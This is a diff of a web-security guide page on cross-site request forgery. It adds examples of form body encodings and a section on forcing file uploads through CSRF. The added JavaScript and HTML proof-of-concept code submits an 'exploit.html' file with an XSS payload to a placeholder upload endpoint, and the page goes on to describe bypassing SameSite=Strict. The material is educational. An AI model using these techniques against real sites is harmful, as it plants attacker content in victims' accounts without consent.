@@ -239,26 +239,71 @@ Here both methods can achieve the same requests, but notice that one is top-leve
 With the `fetch()` method you can completely control the body data while using a `<form>` this is done for you depending on the `Content-Type` header (`enctype=` in HTML). \
 This type can be changed to one of three values, which all have different formats. The `text/plain` type may be interesting if a server expects the `application/json` type which is normally impossible, but also accepts this as an alternative. Here are all three:
 
-<pre class="language-http"><code class="lang-http">Content-Type: application/x-www-form-urlencoded
-<strong>name1=value1&#x26;name2=value2
-</strong>
-Content-Type: multipart/form-data
-<strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
-</strong><strong>Content-Disposition: form-data; name="name1"
-</strong><strong>
-</strong><strong>value1
-</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
-</strong><strong>Content-Disposition: form-data; name="name2"
-</strong><strong>
-</strong><strong>value2
-</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ--
-</strong>
-Content-Type: text/plain
-<strong>name1=value1
-</strong><strong>name2=value2
-</strong></code></pre>
+{% code title="application/x-www-form-urlencoded" %}
+```clike
+name1=value1&name2=value2
+```
+{% endcode %}
 
-#### `SameSite=`<mark style="color:red;">`Strict`</mark>: bypassing using client-side redirect
+{% code title="multipart/form-data" %}
+```clike
+------WebKitFormBoundaryS9COBpBA97fjAsLJ
+Content-Disposition: form-data; name="name1"
+
+value1
+------WebKitFormBoundaryS9COBpBA97fjAsLJ
+Content-Disposition: form-data; name="name2"
+
+value2
+------WebKitFormBoundaryS9COBpBA97fjAsLJ--
+```
+{% endcode %}
+
+{% code title="text/plain" %}
+```clike
+name1=value1
+name2=value2
+```
+{% endcode %}
+
+#### Sending files
+
+One tricky exploit is if you need to **upload a file** **through CSRF**. This is normally a manual action of selecting a file from the filesystem, but can actually be fully automated in JavaScript using [`FormData`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest_API/Using_FormData_Objects).
+
+```javascript
+const formData = new FormData();
+
+const content = '<img src onerror=alert(origin)>';
+// const content = new Uint8Array([65, 66, 67, 68]);  // bytes
+const blob = new Blob([content], { type: "text/html" });
+formData.append("file", blob, "exploit.html");
+
+fetch("https://example.com/upload", {
+  method: "POST",
+  body: formData,
+});
+```
+
+This is also possible to do top-level with a `<form>`:
+
+```html
+<form id="form" action="https://example.com/upload" method="post" enctype="multipart/form-data">
+  <input type="file" name="file">
+</form>
+<script>
+  const content = '<img src onerror=alert(origin)>';
+  //const content = new Uint8Array([65, 66, 67, 68]);  // bytes
+  let file = new File([content], "exploit.html", { type: "text/html" });
+
+  let transfer = new DataTransfer();
+  transfer.items.add(file);
+  
+  form.file.files = transfer.files;
+  form.submit();
+</script>
+```
+
+&#x20;`SameSite=`<mark style="color:red;">`Strict`</mark>: bypassing using client-side redirect
 
 As mentioned earlier, the SameSite protection only prevents cross-_site_ requests. If you can create a fake form or have javascript execution on a **sibling domain or different port**, this bypasses the restriction.&#x20;
 
